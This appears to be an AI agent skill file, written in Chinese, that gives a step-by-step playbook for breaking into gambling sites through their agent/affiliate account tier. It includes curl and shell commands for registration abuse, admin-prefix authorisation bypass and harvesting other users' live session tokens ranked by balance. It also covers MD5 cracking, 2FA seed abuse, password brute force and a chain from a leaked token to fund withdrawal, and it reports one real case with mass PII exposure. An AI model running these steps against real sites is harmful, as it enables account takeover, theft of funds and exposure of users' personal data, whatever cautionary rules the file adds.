---
name: agent-probe
description: >-
 测绘引擎·Skill: 博彩站代理商账号体系探针
---

# Skill: 博彩站代理商账号体系探针

## 核心原理

博彩站有三层账号体系（权限递增）：
```
普通用户 < 代理商 (agent/affiliate) < 运营商 (operator) < admin
```

**代理商注册入口几乎全部开放**——因为博彩站需要靠代理商拉新用户。
代理商账号比普通账号拥有 10 倍的 API 攻击面，且代理商后台防护往往比 admin 弱得多。

## 工具

```
tools/ops/agent_probe.py
```

## 四步作战流程

```bash
# Step 1: 发现代理商入口（路径+子域双重扫描）
python3 tools/ops/agent_probe.py discover \
 --base https://TARGET --case CASE \
 --proxy http://住宅IP:端口

# Step 2: 尝试注册代理商账号（自动试多种参数格式）
python3 tools/ops/agent_probe.py register \
 --base https://TARGET --case CASE

# Step 3: 登录成功后，枚举代理商后台所有 API
python3 tools/ops/agent_probe.py api-enum \
 --base https://agent.TARGET --token <登录token> --case CASE

# Step 4: 尝试账号等级越权篡改（Mass Assignment）
python3 tools/ops/agent_probe.py level \
 --base https://TARGET --token <token> --case CASE
```

## 高价值发现后的联动

| 发现 | 下一步 |
|------|--------|
| `/agent/login` 无 Cloudflare 直连 | 直接弱口令爆破（`dict/gambling_admin_passwords.txt`）|
| 代理商注册成功 | `api-enum` 枚举后台 API；找 addBonus/transfer/adjustBalance |
| 代理商 API 未鉴权 | 越权操作所有下级用户；IDOR 枚举 |
| `level` 字段可篡改 | 账号提升为代理商/运营商，解锁更多 API |
| 代理商后台是 Vue/React SPA | APK 逆向或 JS 逆向找隐藏 API 路由 |

## 代理商后台常用 API（枚举时自动覆盖）

- `/api/agent/users` — 查看所有下级用户
- `/api/agent/balance` — 查看佣金/余额
- `/api/agent/addMember` — 创建下级账号
- `/api/agent/adjustBalance` — 调整余额 ← 关键
- `/api/agent/report` — 财务报表
- `/api/agent/commission` — 佣金结算

## 代理商子域模式（discover 自动扫）

`agent.` / `affiliate.` / `partner.` / `proxy.` / `daili.` / `aff.` / `promo.` 等

## 证据落盘

```
exports/bot-recovery/<案卷>/测绘/agent/
 agent_discover.json 发现的入口列表
 agent_register.json 注册结果（含 token）
 agent_api_enum.json API 枚举结果
 level_escalation.json 等级篡改命中
```

## 真源

- 手法：`docs/playbooks/案卷Triage与手法索引.md`


---

## 外部库增量（2026-10-11 分享包）

## 成功口径（按档，禁止跳级）

| 档 | 成立条件 | 不算 |
|----|----------|------|
| L1 | `agent/register` 返回 200 且拿回 role=agent 票 | 只看到登录页 / 注册返回「待审核」 |
| L2 | 代理票打到 admin 前缀端点且**有数据体量**（KB 级） | 200 空 JSON / 只读到自己 |
| L3 | 用回吐的他人票打 `/user/info` 读到**他人**余额/PII | 只解出 JWT payload 结构 |

改他人密码/提款密 = 只在自己账号上演；动他人一律先问（见硬规则）。

## 第 1 步：发现代理入口（路径 + 子域双扫）

```bash
python3 tools/ops/agent_probe.py discover --base https://TARGET --case CASE
```

手工兜底：路径 `/agent/login`、`/agent/register`、`/api/agent/*`、`/api/game/agent/*`、
`/daili`、`/proxy`、`/affiliate`；子域 `agent.` `affiliate.` `partner.` `proxy.` `daili.` `aff.` `promo.`。

**无认证先读前端 JS**（`spa-api-discovery`）：路由全集 + token 键名先落地，
再决定注册与差分顺序 —— 不要凭字典猜路径。

## 第 2 步：零门槛注册 + 登录取票

```bash
python3 tools/ops/agent_probe.py register --base https://TARGET --case CASE
```

手工形态（实测可用的最小体）：

```bash
curl -s -X POST "https://TARGET/api/game/agent/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"selfprobe01","password":"Test@12345"}'
# 判据: {"success":true,"message":"注册成功"}

curl -s -X POST "https://TARGET/api/game/agent/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"selfprobe01","password":"Test@12345"}'
# 取 token / sessionToken
```

注册参数名多试：`username/user/account/mobile`、`password/pass/pwd`。
**注册是真写库**（会建号）⇒ 存在性探测只用缺字段/类型错，别用空参乱打（空参 POST ≠ 零写入）。

## 第 3 步：前缀差分验 BFLA（本卡核心动作）

拿到 agent 票后**不要逐个猜 admin 端点**，用第 1 步抓到的路由全集做前缀替换批量差分：

```bash
# 把路由清单里 /agent/ 段换成 /admin/（及反向），逐条打
while read p; do
  r=$(curl -s -o /dev/null -w '%{http_code} %{size_download}' \
    -H "Authorization: Bearer $AGT" "https://TARGET$p")
  echo "$r $p"
done < routes.txt | sort -k2
```

判读：

| 现象 | 判读 |
|------|------|
| agent 票打 `/admin/*` 返回 200 且有体积 | **BFLA 成立**（后端只查登录不查角色） |
| 200 但体积 ≈ 空对象 | 单值鉴权/掩码开关（`api-authz-idor-testing` §session-single-key），换路 |
| 401 / 403 | 该前缀有角色守卫，继续找没挂守卫的兄弟前缀 |
| 405 | 路由存在方法错，换方法补测（鉴权常挂装饰器，与方法无关） |

同时横向扩前缀：`/api/game/` → `/api/`、`/agent/`、`/user/`、`/admin/`；
管理 API 常独立成域（`admin.<api-domain>`），从前端 JS 里挖出来一起打。

## 第 4 步：★ 回吐字段审计 → 批量接管（最高价值）

**一条命令（探针，推荐）**：

```bash
# 字段全集 + 敏感字段计数 + 票 live/expired 分类；产物只落计数与票指纹
python3 tools/ops/agent_probe.py fields \
  --base https://game.TARGET --token $AGENT_TOKEN --case CASE
#  --paths /api/game/agent/all-users,/api/game/agent/member/list   自定义端点
#  --show-tokens 3      在终端看前 3 个未过期明文票（★ 不落盘）
# 自测（本地 mock，19 条断言，无残留进程）：python3 tools/ops/selftest_agent_fields.py
```

产物 `exports/bot-recovery/<案卷>/测绘/agent/agent_field_audit.json`：
`sensitive{字段→计数}` + `token_audit{total,live,expired,opaque_or_unparsable,max_ttl_h}` + `token_fingerprints`（sha256 前 8 位）。
**他人明文票绝不落盘** —— 报告直接用计数与指纹。

手工等价（探针不可用时）：拿到任何**批量列表端点**（`all-users` / `users` / `member/list`），
第一件事不是看数据，是**拉字段全集**：

```bash
curl -s "https://TARGET/api/game/agent/all-users" -H "Authorization: Bearer $AGT" \
  | jq -c 'map(keys)|add|unique'
```

按此清单找「**不该出现在列表里的凭证字段**」：

| 字段名族 | 后续动作 |
|---|---|
| `sessionToken` / `session` / `token` / `jwt` / `accessToken` / `refreshToken` | **活票** → 直接 Bearer 打 `/user/info` 证明他人身份 |
| `password_md5` / `password` / `passwd` / `salt` | 无盐 MD5 → 本地小字典（top-100）碰撞 |
| `withdrawPassword` / `payPassword` / `fundPwd` | 提款密哈希；配合无旧密覆盖接口 |
| `googleKey` / `otpSecret` / `totp` | 2FA 种子 → 直接生成码 |
| `apiKey` / `secret` / `privateKey` / `mnemonic` | 商户/钱包面，另开专卡 |

**活票优先级排序**（别按列表顺序抓，按钱和剩余寿命排）：

```bash
curl -s ".../all-users" -H "Authorization: Bearer $AGT" \
 | jq -r '.[] | select(.sessionToken) | [.username, .balance,
     ((.sessionToken|split(".")[1]|@base64d|fromjson|.exp) - now)/3600 | floor] | @tsv' \
 | sort -k2 -nr | head -30
```

`@base64d` 对缺 padding 的 payload 会报错 ⇒ 不通就用 python 三行解 `exp`。

**只读证明**（L3，绝不做写操作）：

```bash
curl -s "https://TARGET/api/user/info" -H "Authorization: Bearer $LEAKED" | jq .
# 200 + 他人 username/balance = 成立
```

## 第 5 步：票 → 资金面（务必自制）

```
泄露票 → POST set-withdraw-password（无旧密）→ 绑自控收款址 → 提款申请
```

完整三件套与判据见 `gambling-password-reset-ato` 与 `fund-edge-ops`。
**默认只跑「证明」级动作，且在自控账号上**；陌生账号的改密/提款先问用户。

## 第 6 步：代理商后台本身的面

```bash
python3 tools/ops/agent_probe.py api-enum --base https://agent.TARGET --token $TOKEN --case CASE
python3 tools/ops/agent_probe.py level    --base https://TARGET --token $TOKEN --case CASE
```

| 发现 | 下一步 |
|------|--------|
| `/agent/login` 无 CDN/WAF 直连 | 短字典低速弱口（`auth-brute`）；锁定窗口长就别碰 |
| `agent/api/*` 未鉴权 | 越权操作下级用户；uid 参数化走 `api-authz-idor-testing` |
| `level` / `role` / `group_ids` 可篡改 | Mass Assignment 提权；**改完必须回读对比**（「响应成功 ≠ 落库」，实测踩过：`group[]=3942` 静默失败） |
| 后台是 Vue/React SPA | 前端 chunk 提路由（`spa-api-discovery`） |
| 代理商后台是 exe 客户端 / WebView 壳 | `whitelabel-agent-console-pentest` |

## 实测案例：777VVIP（2026-06，Node.js + Express + MongoDB）

零权限 → 1,129 用户全量 PII + 419 活票 + 33 个无盐 MD5 + 4 组收款账号。
九条漏洞、三条攻击链、CVSS 向量与平台体量全部实证，完整手顺见 **`777vvip-bfla-takeover`**。
同族先例：`whitelabel-agent-console-pentest`、`aks-gofun-gambling-pentest`、`1z-gambling-family-pentest`。

## 交接表

| 情况 | 转卡 |
|------|------|
| 有完整 Node/Express 站型（`game.*` 子域） | `777vvip-bfla-takeover` |
| 票据来自审计日志/操作日志 | `auditlog-ticket-harvesting` |
| 响应字段被掩码而非删除 | `api-authz-idor-testing` §session-single-key |
| 要拖全量用户表 | `id-counter-stride-harvest` / `staged-bulk-exfil-sqli` |
| 改提款密 / 绑收款址 / 最小提现 | `gambling-password-reset-ato`、`fund-edge-ops` |
| 管理后台进不去 | `admin-credential-hunt`、`admin-console-discovery` |

## 硬规则

1. 只打自己注册的号；他人票只做**只读证明**，不写、不改、不提
2. 注册是真写库 —— 探测用缺字段/类型错，不用空参
3. 「响应成功 ≠ 落库」：任何写操作后回读对比
4. 没拿到 200 / 体积 / 业务状态变化，就不写「已攻破」
